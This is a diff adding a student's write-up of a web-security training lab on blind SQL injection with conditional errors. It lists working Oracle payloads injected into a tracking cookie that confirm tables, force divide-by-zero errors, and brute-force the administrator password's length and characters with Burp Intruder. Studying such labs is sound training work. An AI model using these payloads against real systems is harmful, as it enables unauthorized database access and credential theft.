@@ -1,0 +1,136 @@
+Lab #10: Blind SQL injection with conditional errors
+
+
+Target:
+  log in as the administrator user.  
+Hint: 
+  This lab contains a blind SQL injection vulnerability. 
+  The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+  The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. 
+  If the SQL query causes an error, then the application returns a custom error message.
+
+  The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+
+
+
+Solution:
+
+  The results of the SQL query are not returned => Blind SQL injection
+  The application does not respond any differently based on whether the query returns any rows => cannot use blind sqlinjection with conditional errors
+
+
+  1- search for some input vulnerable to sqlinjection
+    the TrackingId parameter in the cookie seems to be vulnerable:
+    adding ' at the end results in http 500 error response
+    adding '' at the end results in http 200 OK response
+    
+    so it seems that we can perform sqlinjection based on conditional errors.
+
+  2- prove that trackingId is vulnerable to sql inj.
+    try ' and 1=1-- => result 200 OK
+        ' and 1=0 -- => result 200 ok 
+    now try:
+          '  || (select '' ) || -- it means to select nothing and it should not get an error
+          result => 500 error 
+          it seems that the database server is not mysql but oracle:
+          so try:
+             '  || (select '' from dual ) || -- dual is a dummy table, oracle needs the from clause
+
+             => error 
+             try:
+             '  || (select '' from dual ) || '
+             => http 200 ok 
+             try:
+             '  || (select '' from dual11111 ) || '
+             =>  http 500 error
+             so it is an oracle database and it is vulnerable to sql injection
+
+  3- confirm that users table exists
+
+      try: 
+        '  || (select '' from users ) || '
+
+      result=> http 500 error 
+        the query breaks down because of an internal error, as it outputs an empty string for each row in the users table 
+        we have to limit the number of return value from the query 
+      try: '  || (select '' from users where rownum=1) || '
+
+        result: http 200 ok 
+        so table users exists
+
+  4- confirm that user administrator exists
+
+    try:
+    '  || (select '' from users where username='administrator') || '
+    result: http 200 ok
+    try:
+    '  || (select '' from users where username='administrator11111') || '
+
+    result: http 200 ok
+    because when the intended user does not exists, it does not select anything and the query returns true
+
+    so we need another form of query to result in error when the user does not exist
+
+    try:
+    ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)|| '
+
+    in the above query, there is an if-else structure, when 1=1 it executes oracle function to_char and devides 1 to 0,
+    that causes and error, otherwise there is no error. 
+    So we expect to get 500 error
+    
+
+    result: 500 error
+    try:
+    ' || (select CASE WHEN(1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual)|| '
+    result: http 200 ok
+
+    so try:
+
+    ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')|| '
+
+    in this query the last part is first executed and if it returns true the rest will be executed and results in an error
+
+    result: http 500 error
+
+    try:
+        ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator11111')|| '
+        result: http 200 ok
+  
+  5- Estimate length of administrator password
+
+    try:
+      ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
+      result: http 500 error
+    try:
+    ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '
+
+    result: http 200 ok
+    so the length is less than 50
+
+    use burpsuit intruder to repeat the attack and find the length:
+    ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>§1§) || '
+
+
+    with number payload from 1 to 50 and step 1.
+
+    from 1 to 19 we recieve http 500 error and from number 20 we recieve http 200 ok. 
+    so the length is 20. 
+
+
+
+
+
+  6- Find the first character of the password:
+
+  try:
+      ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+      result: http 200 ok, so password first character is not a
+
+      Bruteforce the first character:
+            ' || (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='§a§') || '
+      first char is 9
+
+      Since I have no professional version, it takes me so long and does not end sometimes to do a cluster bomb attack and combine two payloads. 
+      So, I repeat it for all other 19 chars manually.
